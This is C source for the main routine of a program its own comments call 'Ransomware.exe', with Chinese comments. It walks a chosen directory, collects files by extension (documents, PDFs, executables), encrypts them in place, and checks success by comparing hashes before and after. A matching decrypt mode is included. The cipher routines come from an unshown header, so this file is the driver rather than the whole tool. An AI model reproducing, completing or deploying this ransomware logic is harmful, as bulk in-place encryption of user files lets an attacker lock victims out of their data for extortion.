#include <stdio.h>
#include <io.h>
#include <stdlib.h>
#include <string.h>
#include "info.h"

// 解决visual studio对于不安全函数使用的报错
#pragma warning(disable : 4996)

/**
* 使用方式
*
* 加密例子如下：
* .\Ransomware.exe -mode encrypt -method 3 -path E:\\CProjects\\TestEncrypt\\ -extension *.txt
* 解密例子如下：
* .\Ransomware.exe encrypt -mode decrypt -method 3 -path E:\\CProjects\\TestEncrypt\\ -extension *.txt
* 
* 参数说明如下：
*	-mode		用法：-mode encrypt 或 -mode decrypt 
				说明：指定加密还是解密
*	-method		用法：-method 0 
				说明：有4个选项 -> 0，1，2，3（分别代表四种加解密方式）
*	-path		用法：-path E:\\CProjects\\TestEncrypt\\ 
				说明：需要检索的路径
*	-extension 
				用法：-extension *.txt,calc.exe,*.docx,*.pdf 
				说明：需要加解密的后缀，用逗号分割
*
**/
int main(int argc, char* argv[]) {
	//// 处理用户的输入
	//char** findExtension;
	//findExtension = malloc((argc - 1) * sizeof(char*));

	//for (int count = 1; count < argc; count++) {
	//	// 为用户输入字符串分配内存空间
	//	findExtension[(count - 1)] = malloc((strlen(argv[count]) + 1) * sizeof(char));
	//	strcpy(findExtension[(count - 1)], argv[count]);
	//}

	//// 定义需要检索的路径
	///*char* findExtension[] = {"E:\\CProjects\\test_encrypt\\*.txt", "E:\\CProjects\\test_encrypt\\*.exe", "E:\\CProjects\\test_encrypt\\*.docx"};*/
	///*int findExtensionLength = sizeof(findExtension) / sizeof(findExtension[0]);*/
	//int findExtensionLength = argc - 1;

	// 用户输入参数个数限定
	if (argc != 9) {
		fprintf(stderr, "Usage:\n");
		return 1;
	}

	char* mode = NULL;
	char* method = NULL;
	char* path = NULL;
	char* extension = NULL;

	// 提取用户输入参数
	for (int i = 0; i < 4; i++) {
		int opt = 1 + 2 * i;

		if (strcmp(argv[opt], "-mode") == 0) {
			mode = calloc(strlen(argv[opt + 1]) + 1, sizeof(char));
			strcpy(mode, argv[opt + 1]);
		}
		else if (strcmp(argv[opt], "-method") == 0) {
			method = calloc(strlen(argv[opt + 1]) + 1, sizeof(char));
			strcpy(method, argv[opt + 1]);
		}
		else if (strcmp(argv[opt], "-path") == 0) {
			path = calloc(strlen(argv[opt + 1]) + 1, sizeof(char));
			strcpy(path, argv[opt + 1]);
		}
		else if (strcmp(argv[opt], "-extension") == 0) {
			extension = calloc(strlen(argv[opt + 1]) + 1, sizeof(char));
			strcpy(extension, argv[opt + 1]);
		}
		else {
			fprintf(stderr, "Usage:\n");
			return 1;
		}
	}

	// 打印用户输入的数据
	/*printf("mode: %s\n path: %s\n extension: %s\n method %s\n", mode, path, extension, method);*/

	// 计算用户输入的后缀字符串的长度
	int extension_length = strlen(extension);

	// 统计后缀名个数
	int extension_num = 0;
	for (int i = 0; i <= extension_length; i++) {
		if (extension[i] == ',' || extension[i] == '\0') {
			extension_num += 1;
		}
	}

	// 拼接目录和后缀名并将其保存为数组
	char** findExtension = path_concat_ext(extension, path);

	// 打印获取到的数组
	/*for (int i = 0; i < extension_num; i++) {
		printf("concat extension: %s\n", findExtension[i]);
	}*/

	// check用户是加密还是解密
	if (strcmp(mode, "encrypt") == 0) {
		printf("正在执行加密\n");

		// 指向ExistFile结构体数组的指针
		ExistFile* exist_files;

		// 结构体数组长度
		int exist_files_length;

		printf("收集文件信息[+]\n");
		// 遍历特定后缀文件保存到ExistFile结构体数组
		exist_files = retrieve(findExtension, extension_num);
		exist_files_length = exist_files->file_num;

		printf("生成所有原始文件的hash[+]\n");
		// 生成所有原始文件的hash
		for (int i = 0; i < exist_files_length; i++, exist_files++) {
			char* origin_file_hash = generate_hash(exist_files->file_path);
			int hash_length = 20;
			exist_files->origin_file_hash = (char*)malloc(hash_length);
			strcpy(exist_files->origin_file_hash, origin_file_hash);
		}

		// 恢复exist_files指针到初始位置
		exist_files -= exist_files_length;

		printf("加密所有文件[+]\n");
		// 对所有文件进行加密
		for (int i = 0; i < exist_files_length; i++, exist_files++) {
			encrypt_file(exist_files->file_path, atoi(method));
		}

		// 恢复exist_files指针到初始位置
		exist_files -= exist_files_length;

		printf("生成所有加密文件的hash[+]\n");
		// 生成所有加密文件的hash
		for (int i = 0; i < exist_files_length; i++, exist_files++) {
			char* encrypt_file_hash = generate_hash(exist_files->file_path);
			int hash_length = 20;
			exist_files->encrypt_file_hash = (char*)malloc(hash_length);
			strcpy(exist_files->encrypt_file_hash, encrypt_file_hash);
		}

		// 恢复exist_files指针到初始位置
		exist_files -= exist_files_length;

		printf("对比文件加密前后的hash[+]\n");
		// 对比文件加密前后hash
		for (int i = 0; i < exist_files_length; i++, exist_files++) {
			int encrypt_result = 0;
			encrypt_result = compare_hash(exist_files->origin_file_hash, exist_files->encrypt_file_hash);

			// 前后hash不一致，则表明加密成功
			if (encrypt_result != 0) {
				printf("文件名称: %s, 文件路径 %s, encrypt successfully!\n", exist_files->file_name, exist_files->file_path);
			}
		}

		// 恢复exist_files指针到初始位置
		exist_files -= exist_files_length;

		// 释放所有动态分配的内存
		// 释放文件绝对路径数组内存
		for (int i = 0; i < extension_num; i++) {
			free(findExtension[i]);
		}
		free(findExtension);

		// 释放文件结构体数组内存
		for (int i = 0; i < exist_files_length; i++, exist_files++) {
			free(exist_files->file_name);
			free(exist_files->file_path);
			free(exist_files->origin_file_hash);
			free(exist_files->encrypt_file_hash);
		}
		exist_files -= exist_files_length;
		free(exist_files);
	}
	else if (strcmp(mode, "decrypt") == 0) {

		// 指向ExistFile结构体数组的指针
		ExistFile* exist_files;

		// 结构体数组长度
		int exist_files_length;

		printf("收集文件信息[+]\n");
		// 遍历特定后缀文件保存到ExistFile结构体数组
		exist_files = retrieve(findExtension, extension_num);
		exist_files_length = exist_files->file_num;

		// 对所有文件进行解密
		printf("对加密的文件进行解密[+]\n");
		for (int i = 0; i < exist_files_length; i++, exist_files++) {
			decrypt_file(exist_files->file_path, atoi(method));
		}

		// 恢复exist_files指针到初始位置
		exist_files -= exist_files_length;

		// 释放所有动态分配的内存
		//
		for (int i = 0; i < extension_num; i++) {
			free(findExtension[i]);
		}
		free(findExtension);

		// 
		for (int i = 0; i < exist_files_length; i++, exist_files++) {
			free(exist_files->file_name);
			free(exist_files->file_path);
		}
		exist_files -= exist_files_length;
		free(exist_files);
	}
	else {
		printf("%s 请在-mode参数后指定当前加密还是解密\n", findExtension[0]);
		exit(0);
	}
}
